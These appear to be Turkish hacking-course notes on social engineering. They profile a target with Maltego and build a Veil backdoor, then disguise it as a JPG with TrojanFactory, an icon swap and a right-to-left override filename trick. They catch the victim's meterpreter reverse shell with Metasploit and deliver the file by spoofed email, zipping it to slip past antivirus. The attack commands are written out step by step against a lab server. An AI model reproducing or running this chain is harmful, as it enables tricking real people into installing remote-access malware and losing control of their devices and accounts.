	SOCIAL ENGINEERING
 Önceki bölümlerde gördüğümüz backdoor'du
 Bu backdoor'u nasıl trojan halinde gösterebiliriz,
 kullanıcılar hakkında bilgi edinme gibi şeyleri göreceğiz.

 Hackerların kötü amaçlı kullanıcılara saldırırken kişiler hakkında bilgi toplaması,
 ve bu bilgilerden kişilerin zaaflarını bulup onu kullanarak, şahsın instagram hesabını hacklemek vs.





	MALTEGO
 -Maltego- (not defterinin aynısı)
 Bize kullanıcılar hakkında bilgi toplamamızı sağlar.
 Kali'den Maltego aratarak girebilirsiniz.
 Sol üstteki + butonu ile New Graph oluşturabiliriz.
 Sol kısımda gözüken paletler ile neyi araştırmamız gerektiğini girebiliriz.
 Örneğin Website paletini seçtik, unicornitems.com gibi bir site girersek,
 uygulama bize o site hakkında detaylı bilgileri gösterir.

 Person paletini kullandığımızda o kişi hakkında bilgi edinebiliriz.
 Sonuçlarda Udemy çıktıysa "isim + Udemy" diye aratabiliriz.
 O kişi hakkında çıkan görsellerden birisini indirelim. İndirdiğimiz görseli backdoor'umuza nasıl ekleriz? Nasıl ikon yaparız?
 exe dosyasının ikonunu jpg gibi yapalım. "create ico from jpg online" diye aratalım. Görselimizi siteye yükleyelim. exe dosyamızın ikonunu istediğimiz jpg yaptık.
 Şimdi ise görselimiz ve ikonumuz olduğuna göre backdoor'umuzu, trojana çevirebiliriz.
 Öncelikle bir backdoor oluşturalum. cd /opt/Veil/ içerisine python3 Veil.py yazarak backdoor oluşturabiliriz.
 use 1		tcp bağlantısı seçelim. (ne seçtiğimiz önemli değil)	use 7	Gerekli ayarları yaptıktan sonra backdoor'umuzu kaydedelim. (NewPayload.exe)
 Şimdi ise backdoor'umuzu jpg ile birleştirelim. https://github.com/atilsamancioglu/TrojanFactory





	EXE DOSYASINI NASIL JPG GİBİ GÖSTEREBİLİRİZ?
 AutoIt, Backdoor'u JPG gibi gösterirken işe yarar.
cd /opt/TrojanFactory/
service apache2 start	-> Kendi ip adresimize girip dosyamızın URL'sini alıyoruz.
"python3 trojan_factory.py --help" yazıp hangi uzantıları girebileceğimizi  görebiliriz. (-f -e -o -i) gibi

python3 trojan_factory.py -f http://10.0.2.10/backdoors/atilsam.jpg -e http://10.0.2.10/backdoors/NewPayload.exe -o /opt/TrojanFactory/newtest.exe -i http://10.0.2.10/backdoors/atilsam.ico
	.ico dosyamızı bulamadığı için /opt/TrojanFactory/icons/  -> içerisindeki generic.ico zaten varolan ikonu sildik ve kendi ikonumuzu bu klasöre atıp ismine generic.ico adını verdik.


	-f -> Hangi dosyayı göstermek istiyoruz.
	-e -> Evil File (Kötü Dosya) backdoor'umuzun kendisi.
	-o -> Nereye koymak istediğimizi gireriz.


 Sanal makinemizden 10.0.2.10/backdoors/ adresine girip newtest.exe dosyasını indirirsek dosyanın jpg gibi gözüktüğünü görebiliriz.
 msfconsole'umuzu açarak dinlemeye başlayabiliriz. (msfconsole'u açamazsan buraya girip çalıştırmayı dene -> cd /usr/share/)
msfconsole
use exploit/multi/handler	-> Bu modül bizim birçok yerde gelen bağlantıları hundle etmemizi (yönetmemizi) sağlıyor.
set payload windows/meterpreter/reverse_tcp
show options
set LHOST 10.0.2.10
exploit		-> exploit -j -z Yazarsak arka planda dinler.

 Sanal makinemizden indirmiş olduğumuz newtest.exe dosyasını açarsak normal görsel olarak gözükür.
 ve Meterpreter Sessioun'ımız uyanmış olacaktır.

sessions -l	-> Listeleme yapar.
sessions -1	-> 1.Session'ımızın içine girer.
ls		-> Windowsu hacklemeyi başardığımızı görebiliriz.





	DOSYA UZANTISI NASIL DEĞİŞTİRİLİR?
 Dosyamızın sonu .exe ile bitiyor bu şüpheli bir durumdur, bunun uzantısını da değiştirmemiz gerekiyor.
 Bunun için: apt-get install characters -> Sol üstten Kali'ye tıklayıp Char yazıp açabiliriz. Buradan "right-to-left Override" karakterini kopyalıyoruz.
 right-to-left Override nasıl çalışır?: androidpgj.exe olan dosyamızı sağdan sola doğru ters çevirir yani bu dosyanın çıktısı androidexe.jpg olacaktır.
 Değiştirmek istediğimiz dosyayı(androidgpj.exe) Rename yapıp, gpj.exe olan kısma yani ters çevirmek istediğimiz yere yapıştır yapıyoruz ve gpj.exe yazıyoruz.
 Kullandığımız araç bize bunu ters yazdıracak ve dosya uzantısı androidexe.jpg olarak gözükecektir.

 Tekrardan msfconsole'umuza girelim.(msfconsole'u açamazsan buraya girip çalıştırmayı dene -> cd /usr/share/)
msfconsole
use exploit/multi/handler	-> Bu modül bizim birçok yerde gelen bağlantıları hundle etmemizi (yönetmemizi) sağlıyor.
set payload windows/meterpreter/reverse_tcp
show options
set LHOST 10.0.2.10
exploit -j- z

 Sanal makinemizden (Hedef bilgisayarımızdan) indirmiş olduğumuz dosyayı açıyoruz bu sefer hem uzantısı .jpg hem de gerçekten görsel gibi gözüküyor.
 ve Session'umuz açılmış olacaktır.

sessions -l
sessions -1
ls		-> Yeniden cihazımızı Hacklemeyi başardık.




	EMAİLLERİ DEĞİŞTİRMEK
Hackerlar genelde bu dosyayı zip olarak yükler .exe gibi inmez ve böylece antivirüs programlarına yakalanma olasılığı azalır.
Özellikle kötü niyetli hackerlar atılan mail'i özel birinden geliyormuş gibi gösterebilir.
Email spoofing işlemlerini yapabileceğimiz birçok site var. "anonymous email sender"
mailspre.com -> web sitesi işimizi görecektir. Mail'in açıklama kısmına right-to-left yaptığımız jpg.exe dosyasının linkini koyuyoruz.
									http://10.0.2.10/backdoors/android%e2%80%aegpj.exe
Mail'i alan kişi bu linki indirirse bize bağlantı göndermiş olacak ve şahsın cihazını hacklemiş olacağız.

Biz tüm işlemleri kendi web server'larımız(10.0.2.10/backdoors) üzerinden gerçekleştirdik fakat "file upload" sitelerinden (dropbox gibi) bazı siteler de bu işlemi gerçekleştirebilir.
Bazı siteler .exe dosyalarına izin vermediği için hackerlar genelde önce bu dosyayı zip'e çevirir ve daha sonra siteye upload eder.